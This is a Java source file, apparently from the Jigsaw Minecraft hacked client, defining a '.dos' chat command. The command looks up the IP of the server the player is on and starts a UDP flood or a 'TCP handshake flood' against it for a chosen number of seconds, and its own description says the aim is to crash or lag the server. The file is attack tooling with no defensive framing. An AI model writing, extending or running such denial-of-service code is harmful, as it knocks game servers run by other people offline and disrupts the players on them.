package me.robbanrobbin.jigsaw.client.commands;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Random;
import java.util.concurrent.atomic.AtomicInteger;

import me.robbanrobbin.jigsaw.client.WaitTimer;
import me.robbanrobbin.jigsaw.client.main.Jigsaw;
import me.robbanrobbin.jigsaw.client.modules.DoSMod;
import net.minecraft.client.multiplayer.ServerAddress;

public class CommandDos extends Command {

	@Override
	public void run(String[] commands) {
		if(DoSMod.flooding) {
			Jigsaw.chatMessage("§cAlready DoSing!!");
			return;
		}
		if(mc.getCurrentServerData() == null) {
			Jigsaw.chatMessage("§cYou are not on a server!");
			return;
		}
		if (commands.length < 2) {
			Jigsaw.chatMessage("§cEnter the DoS time!");
			return;
		}
		if (commands.length < 3) {
			Jigsaw.chatMessage("§cEnter the DoS type!");
			return;
		}
		final int time = Integer.parseInt(commands[1]);
		final int type = Integer.parseInt(commands[2]);
		if(type != 1 && type != 2) {
			Jigsaw.chatMessage("§cUknown DoS type: " + type + ". Only 1 and 2 are permitted!");
			return;
		}
		final byte[] bytes = new byte[1024];
		final Random rand = new Random();
		InetAddress addr = null;
		try {
			addr = InetAddress.getByName(ServerAddress.func_78860_a(mc.getCurrentServerData().serverIP).getIP());
		} catch (UnknownHostException e2) {
			e2.printStackTrace();
		}
		if(addr == null) {
			Jigsaw.chatMessage("§cError finding ip! Server hostname might not be registered §cin most DNS servers yet...");
			return;
		}
		final InetAddress addrrrrr = addr;
		DoSMod.startFlooding(addrrrrr, bytes, rand, time, type);
		
	}

	@Override
	public String getActivator() {
		return ".dos";
	}

	@Override
	public String getSyntax() {
		return ".dos <time in seconds> <1(UDP)/2(TCP)>";
	}

	@Override
	public String getDesc() {
		return "Tries to crash or lag the server. Type 1 is UDP flood. Type 2 is experimental TCP handshake flood.";
	}
}
